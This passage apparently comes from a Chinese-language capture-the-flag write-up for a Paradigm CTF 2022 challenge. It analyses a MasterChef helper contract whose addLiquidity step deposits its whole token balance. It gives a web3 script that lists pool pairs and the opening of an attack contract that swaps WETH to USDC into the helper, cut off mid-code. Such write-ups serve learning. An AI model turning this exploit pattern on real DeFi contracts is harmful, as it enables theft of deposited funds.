<pre data-role="codeBlock" data-info="solidity" class="language-solidity"><span class="token keyword keyword-function">function</span> <span class="token function">swapTokenForPoolToken</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> poolId<span class="token punctuation">,</span> <span class="token builtin">address</span> tokenIn<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amountIn<span class="token punctuation">,</span> <span class="token builtin">uint256</span> minAmountOut<span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token builtin">address</span> lpToken<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> masterchef<span class="token punctuation">.</span><span class="token function">poolInfo</span><span class="token punctuation">(</span>poolId<span class="token punctuation">)</span><span class="token punctuation">;</span>					<span class="token comment">//&#x83B7;&#x53D6;poolId&#x5BF9;&#x5E94;&#x4EA4;&#x6613;&#x6C60;</span>
        <span class="token builtin">address</span> tokenOut0 <span class="token operator">=</span> <span class="token function">UniswapV2PairLike</span><span class="token punctuation">(</span>lpToken<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">token0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//&#x83B7;&#x53D6;&#x4EA4;&#x6613;&#x6C60;&#x5BF9;&#x5E94;&#x7684;token</span>
        <span class="token builtin">address</span> tokenOut1 <span class="token operator">=</span> <span class="token function">UniswapV2PairLike</span><span class="token punctuation">(</span>lpToken<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">token1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//&#x6BCF;&#x4E2A;token&#x90FD;&#x7ED9;router&#x6388;&#x6743;</span>
        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenOut0<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenOut1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amountIn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//&#x5C06;&#x8981;&#x5151;&#x6362;&#x7684;Weth&#x53D1;&#x9001;&#x5230;&#x6B64;&#x5408;&#x7EA6;</span>

        <span class="token comment">// swap for both tokens of the lp pool</span>
        <span class="token function">_swap</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">,</span> tokenOut0<span class="token punctuation">,</span> amountIn <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>							<span class="token comment">//&#x5C06;&#x5151;&#x6362;&#x7684;Weth&#x5206;&#x522B;&#x4EA4;&#x6362;&#x4E3A;&#x4E24;&#x79CD;token</span>
        <span class="token function">_swap</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">,</span> tokenOut1<span class="token punctuation">,</span> amountIn <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// add liquidity and give lp tokens to msg.sender</span>
        <span class="token function">_addLiquidity</span><span class="token punctuation">(</span>tokenOut0<span class="token punctuation">,</span> tokenOut1<span class="token punctuation">,</span> minAmountOut<span class="token punctuation">)</span><span class="token punctuation">;</span>					
    <span class="token punctuation">}</span>
</pre><p>&#x5728;&#x51FD;&#x6570;&#x6700;&#x540E;&#x8C03;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x6DFB;&#x52A0;&#x6D41;&#x52A8;&#x6027;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x53EF;&#x80FD;&#x5C31;&#x662F;&#x8FD9;&#x7B14;&#x8BEF;&#x8F6C;&#x8D26;&#x6700;&#x7EC8;&#x7684;&#x53BB;&#x5411;</p>
<pre data-role="codeBlock" data-info="solidity" class="language-solidity"><span class="token keyword keyword-function">function</span> <span class="token function">_addLiquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token0<span class="token punctuation">,</span> <span class="token builtin">address</span> token1<span class="token punctuation">,</span> <span class="token builtin">uint256</span> minAmountOut<span class="token punctuation">)</span> <span class="token keyword keyword-internal">internal</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token punctuation">,</span><span class="token punctuation">,</span> <span class="token builtin">uint256</span> amountOut<span class="token punctuation">)</span> <span class="token operator">=</span> router<span class="token punctuation">.</span><span class="token function">addLiquidity</span><span class="token punctuation">(</span>
            token0<span class="token punctuation">,</span> 
            token1<span class="token punctuation">,</span> 
            <span class="token function">ERC20Like</span><span class="token punctuation">(</span>token0<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 			<span class="token comment">//&#x6F0F;&#x6D1E;&#x6240;&#x5728;</span>
            <span class="token function">ERC20Like</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token comment">//</span>
            <span class="token number">0</span><span class="token punctuation">,</span> 
            <span class="token number">0</span><span class="token punctuation">,</span> 
            msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> 
            block<span class="token punctuation">.</span>timestamp
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword keyword-require">require</span><span class="token punctuation">(</span>amountOut <span class="token operator">&gt;=</span> minAmountOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</pre><p>&#x4E0D;&#x96BE;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x91CC;&#x6DFB;&#x52A0;&#x6D41;&#x52A8;&#x6027;&#x65F6;&#xFF0C;&#x5C45;&#x7136;&#x662F;&#x628A;&#x81EA;&#x5DF1;&#x6240;&#x6709;&#x7684;&#x4F59;&#x989D;&#x5168;&#x90E8;&#x53D1;&#x9001;&#x5230;router&#x91CC;&#x53BB;<code>addLiquidity</code>&#xFF0C;&#x8FD9;&#x662F;&#x660E;&#x663E;&#x4E0D;&#x5408;&#x7406;&#x7684;&#xFF0C;&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x80FD;&#x63A7;&#x5236;&#x4EE5;&#x4E0B;&#x4EA4;&#x6613;&#x5BF9;&#x7684;&#x4EA4;&#x6362;&#x989D;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x628A;&#x6B64;&#x5408;&#x7EA6;&#x7684;ETH&#x4F59;&#x989D;&#x5168;&#x90E8;&#x52A0;&#x5165;&#x5230;&#x6D41;&#x52A8;&#x6027;&#x6C60;&#x5B50;&#x5F53;&#x4E2D;&#x3002;</p>
<h2 class="mume-header" id="exploit">Exploit</h2>

<p>&#x5BF9;&#x5E94;&#x4EE5;&#x4E0A;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x60F3;&#x8981;&#x89E3;&#x51B3;&#x6B64;<code>Challange</code>,&#x6211;&#x4EEC;&#x8FD8;&#x5F97;&#x5230;&#x4E24;&#x79CD;token&#x53BB;&#x63A7;&#x5236;&#x6D41;&#x52A8;&#x6027;&#x5151;&#x6362;&#x7684;&#x6570;&#x91CF;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9009;&#x62E9;usdc&#x548C;dai&#xFF0C;&#x5728;<code>etherscan</code>&#x91CC;&#x53EF;&#x4EE5;&#x67E5;&#x5230;<code>poolId</code>&#x4E3A;1&#x7684;&#x65F6;&#x5019;&#x5BF9;&#x5E94;&#x7684;pair&#x5C31;&#x662F;usdc&#x548C;Weth,&#x5E76;&#x53EF;&#x83B7;&#x5F97;token&#x5BF9;&#x5E94;&#x7684;&#x5730;&#x5740;<br>
<img src="../images/ParadigmCTF/2022/CTF01.png" alt><br>
<img src="../images/ParadigmCTF/2022/CTF02.png" alt><br>
<img src="../images/ParadigmCTF/2022/CTF03.png" alt></p>
<p>&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x811A;&#x672C;&#x6765;&#x83B7;&#x53D6;&#x4EA4;&#x6613;&#x5BF9;&#x4FE1;&#x606F;:</p>
<pre data-role="codeBlock" data-info="python" class="language-python"><span class="token keyword keyword-import">import</span> json

<span class="token keyword keyword-import">import</span> web3
<span class="token keyword keyword-from">from</span> web3 <span class="token keyword keyword-import">import</span> Web3

RPC_URL <span class="token operator">=</span> <span class="token string">&apos;http://127.0.0.1:8545/b7cb95db-d484-4b12-8c94-08c92580eeec&apos;</span>
w3 <span class="token operator">=</span> web3<span class="token punctuation">.</span>Web3<span class="token punctuation">(</span>web3<span class="token punctuation">.</span>Web3<span class="token punctuation">.</span>HTTPProvider<span class="token punctuation">(</span>RPC_URL<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># &#x901A;&#x8FC7;solc&#x83B7;&#x5F97;abi</span>
MasterChefLikeAbi <span class="token operator">=</span> <span class="token triple-quoted-string string">&apos;&apos;&apos;
[{&quot;inputs&quot;:[{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;poolInfo&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;lpToken&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;allocPoint&quot;,&quot;type&quot;:&quot;uint256&quot;},{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;lastRewardBlock&quot;,&quot;type&quot;:&quot;uint256&quot;},{&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;accSushiPerShare&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;}]
&apos;&apos;&apos;</span>
UniswapV2pairLikeAbi <span class="token operator">=</span> <span class="token triple-quoted-string string">&apos;&apos;&apos;
[{&quot;inputs&quot;:[],&quot;name&quot;:&quot;token0&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;inputs&quot;:[],&quot;name&quot;:&quot;token1&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;}]
&apos;&apos;&apos;</span>

setup_abi <span class="token operator">=</span> <span class="token triple-quoted-string string">&apos;&apos;&apos;
[{&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;payable&quot;,&quot;type&quot;:&quot;constructor&quot;},{&quot;inputs&quot;:[],&quot;name&quot;:&quot;isSolved&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;inputs&quot;:[],&quot;name&quot;:&quot;mcHelper&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;contract MasterChefHelper&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;inputs&quot;:[],&quot;name&quot;:&quot;weth&quot;,&quot;outputs&quot;:[{&quot;internalType&quot;:&quot;contract WETH9&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;}]
&apos;&apos;&apos;</span>

erc20_abi <span class="token operator">=</span> <span class="token triple-quoted-string string">&apos;&apos;&apos;
[{&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;name&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;string&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[{&quot;name&quot;:&quot;_spender&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;_value&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;approve&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;totalSupply&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[{&quot;name&quot;:&quot;_from&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;_to&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;_value&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;transferFrom&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;decimals&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint8&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:true,&quot;inputs&quot;:[{&quot;name&quot;:&quot;_owner&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;name&quot;:&quot;balanceOf&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;balance&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;symbol&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;string&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[{&quot;name&quot;:&quot;_to&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;_value&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;transfer&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:true,&quot;inputs&quot;:[{&quot;name&quot;:&quot;_owner&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;_spender&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;name&quot;:&quot;allowance&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;payable&quot;:true,&quot;stateMutability&quot;:&quot;payable&quot;,&quot;type&quot;:&quot;fallback&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:true,&quot;name&quot;:&quot;owner&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:true,&quot;name&quot;:&quot;spender&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;value&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;Approval&quot;,&quot;type&quot;:&quot;event&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:true,&quot;name&quot;:&quot;from&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:true,&quot;name&quot;:&quot;to&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;value&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;Transfer&quot;,&quot;type&quot;:&quot;event&quot;}]
&apos;&apos;&apos;</span>


<span class="token keyword keyword-def">def</span> <span class="token function">get_pair_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    mastercheflike <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>Web3<span class="token punctuation">.</span>toChecksumAddress<span class="token punctuation">(</span><span class="token string">&apos;0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>abi<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>MasterChefLikeAbi<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword keyword-for">for</span> i <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        pool_info <span class="token operator">=</span> mastercheflike<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>poolInfo<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># lpToken address</span>
        lp_token <span class="token operator">=</span> pool_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        pair <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>Web3<span class="token punctuation">.</span>toChecksumAddress<span class="token punctuation">(</span>lp_token<span class="token punctuation">)</span><span class="token punctuation">,</span> abi<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>UniswapV2pairLikeAbi<span class="token punctuation">)</span><span class="token punctuation">)</span>
        token0 <span class="token operator">=</span> pair<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>token0<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>
        token1 <span class="token operator">=</span> pair<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>token1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>
        token0_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>Web3<span class="token punctuation">.</span>toChecksumAddress<span class="token punctuation">(</span>token0<span class="token punctuation">)</span><span class="token punctuation">,</span>abi<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>erc20_abi<span class="token punctuation">)</span><span class="token punctuation">)</span>
        token1_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>Web3<span class="token punctuation">.</span>toChecksumAddress<span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">,</span>abi<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>erc20_abi<span class="token punctuation">)</span><span class="token punctuation">)</span>
        token0_name <span class="token operator">=</span> token0_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>symbol<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>
        token1_name <span class="token operator">=</span> token1_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>symbol<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>
        format_msg <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&apos;pair_id:</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,lp_address:</span><span class="token interpolation"><span class="token punctuation">{</span>lp_token<span class="token punctuation">}</span></span><span class="token string">,token0:</span><span class="token interpolation"><span class="token punctuation">{</span>token0_name<span class="token punctuation">}</span></span><span class="token string">,token1:</span><span class="token interpolation"><span class="token punctuation">{</span>token1_name<span class="token punctuation">}</span></span><span class="token string">&apos;</span></span>
        <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span>format_msg<span class="token punctuation">)</span>
        <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&apos;token0_address:</span><span class="token interpolation"><span class="token punctuation">{</span>token0<span class="token punctuation">}</span></span><span class="token string">,token1_address:</span><span class="token interpolation"><span class="token punctuation">{</span>token1<span class="token punctuation">}</span></span><span class="token string">&apos;</span></span><span class="token punctuation">)</span>


<span class="token keyword keyword-if">if</span> __name__ <span class="token operator">==</span> <span class="token string">&apos;__main__&apos;</span><span class="token punctuation">:</span>
    get_pair_info<span class="token punctuation">(</span><span class="token punctuation">)</span>

</pre><p>&#x83B7;&#x53D6;&#x5230;&#x7684;&#x4EA4;&#x6613;&#x5BF9;&#x5982;&#x4E0B;:</p>
<pre data-role="codeBlock" data-info class="language-"><code>pair_id:0,lp_address:0x06da0fd433C1A5d7a4faa01111c044910A184553,token0:WETH,token1:USDT
pair_id:1,lp_address:0x397FF1542f962076d0BFE58eA045FfA2d347ACa0,token0:USDC,token1:WETH
pair_id:2,lp_address:0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f,token0:DAI,token1:WETH
pair_id:3,lp_address:0xF1F85b2C54a2bD284B1cf4141D64fD171Bd85539,token0:sUSD,token1:WETH
pair_id:4,lp_address:0x31503dcb60119A812feE820bb7042752019F2355,token0:COMP,token1:WETH
pair_id:5,lp_address:0x5E63360E891BD60C69445970256C260b0A6A54c6,token0:LEND,token1:WETH
pair_id:6,lp_address:0xA1d7b2d891e3A1f9ef4bBC5be20630C2FEB1c470,token0:SNX,token1:WETH
pair_id:7,lp_address:0x001b6450083E531A5a7Bf310BD2c1Af4247E23D4,token0:UMA,token1:WETH
pair_id:8,lp_address:0xC40D16476380e4037e6b1A2594cAF6a6cc8Da967,token0:LINK,token1:WETH
pair_id:9,lp_address:0xA75F7c2F025f470355515482BdE9EFA8153536A8,token0:BAND,token1:WETH
pair_id:10,lp_address:0xCb2286d9471cc185281c4f763d34A962ED212962,token0:WETH,token1:AMPL
pair_id:11,lp_address:0x088ee5007C98a9677165D78dD2109AE4a3D04d0C,token0:YFI,token1:WETH
pair_id:12,lp_address:0x795065dCc9f64b5614C407a6EFDC400DA6221FB0,token0:SUSHI,token1:WETH
pair_id:13,lp_address:0x611CDe65deA90918c0078ac0400A72B0D25B9bb1,token0:REN,token1:WETH
pair_id:14,lp_address:0xaAD22f5543FCDaA694B68f94Be177B561836AE57,token0:sUSD,token1:$BASED
pair_id:15,lp_address:0x117d4288B3635021a3D612FE05a3Cbf5C717fEf2,token0:SRM,token1:WETH
pair_id:16,lp_address:0x95b54C8Da12BB23F7A5F6E26C38D04aCC6F81820,token0:YAMv2,token1:WETH
pair_id:17,lp_address:0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009,token0:WETH,token1:CRV
pair_id:18,lp_address:0xDafd66636E2561b0284EDdE37e42d192F2844D40,token0:UNI,token1:WETH
pair_id:19,lp_address:0x36e2FCCCc59e5747Ff63a03ea2e5C0c2C14911e7,token0:xSUSHI,token1:WETH
</code></pre><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5199;&#x51FA;&#x4EE5;&#x4E0B;&#x653B;&#x51FB;&#x5408;&#x7EA6;&#xFF1A;</p>
<pre data-role="codeBlock" data-info="solidity" class="language-solidity"><span class="token keyword keyword-pragma">pragma</span> <span class="token keyword keyword-solidity">solidity</span> <span class="token number">0.8</span><span class="token number">.16</span><span class="token punctuation">;</span>

<span class="token keyword keyword-import">import</span> <span class="token string">&quot;./UniswapV2Like.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword keyword-import">import</span> <span class="token string">&quot;./Setup.sol&quot;</span><span class="token punctuation">;</span> 
<span class="token keyword keyword-import">import</span> <span class="token string">&quot;./MasterChefHelper.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword keyword-contract">contract</span> <span class="token class-name">Exploit</span><span class="token punctuation">{</span>
    
    <span class="token keyword keyword-constructor">constructor</span><span class="token punctuation">(</span>Setup setup<span class="token punctuation">)</span> <span class="token keyword keyword-payable">payable</span> <span class="token punctuation">{</span>

        WETH9 weth <span class="token operator">=</span> setup<span class="token punctuation">.</span><span class="token function">weth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		MasterChefHelper mcHelper <span class="token operator">=</span> setup<span class="token punctuation">.</span><span class="token function">mcHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        UniswapV2RouterLike router <span class="token operator">=</span> <span class="token function">UniswapV2RouterLike</span><span class="token punctuation">(</span><span class="token number">0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> usdc <span class="token operator">=</span> <span class="token number">0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> dai <span class="token operator">=</span> <span class="token number">0x6B175474E89094C44Da98b954EedeAC495271d0F</span><span class="token punctuation">;</span>
		weth<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>

		weth<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">40</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword keyword-memory">memory</span> path <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>weth<span class="token punctuation">)</span><span class="token punctuation">;</span>
		path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> usdc<span class="token punctuation">;</span>
		router<span class="token punctuation">.</span><span class="token function">swapExactTokensForTokens</span><span class="token punctuation">(</span>
			<span class="token number">11</span> ether<span class="token punctuation">,</span>
			<span class="token number">0</span><span class="token punctuation">,</span>
			path<span class="token punctuation">,</span>
			<span class="token builtin">address</span><span class="token punctuation">(</span>mcHelper<span class="token punctuation">)</span><span class="token punctuation">,</span>
			block<span class="token punctuation">.</span>timestamp
